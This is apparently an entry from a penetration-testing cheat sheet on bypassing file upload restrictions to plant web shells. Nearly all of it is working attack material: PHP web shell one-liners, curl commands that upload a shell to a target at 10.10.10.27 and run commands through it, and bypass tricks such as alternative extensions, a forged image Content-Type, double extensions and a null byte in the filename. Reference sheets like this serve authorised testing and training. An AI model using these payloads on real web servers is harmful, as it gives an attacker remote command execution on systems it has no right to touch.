---
description: |
  File upload bypass techniques to upload web shells — defeating extension filters, content-type checks, and filename restrictions.
command: |
  # Basic PHP webshell upload
  # shell.php contents:
  <?php system($_REQUEST['cmd']); ?>

  # Upload via curl
  curl -F "file=@shell.php" http://10.10.10.27/upload
  # Access: http://10.10.10.27/uploads/shell.php?cmd=id

  # Bypass extension filters — try alternative PHP extensions
  shell.php5
  shell.phtml
  shell.pHp
  shell.php7
  shell.phar

  # Bypass content-type check — change Content-Type header
  curl -F "file=@shell.php;type=image/jpeg" http://10.10.10.27/upload

  # Double extension bypass
  shell.php.jpg

  # Null byte in filename (older systems)
  shell.php%00.jpg

  # Webshell payloads
  # Standard webshell
  <?php system($_REQUEST['cmd']); ?>

  # Filter bypass — variable variable trick
  {${system($_REQUEST[0])}}

  # Minimal webshell
  <?=`$_GET[0]`?>
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - File_Upload
references:
  - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  - https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html
---
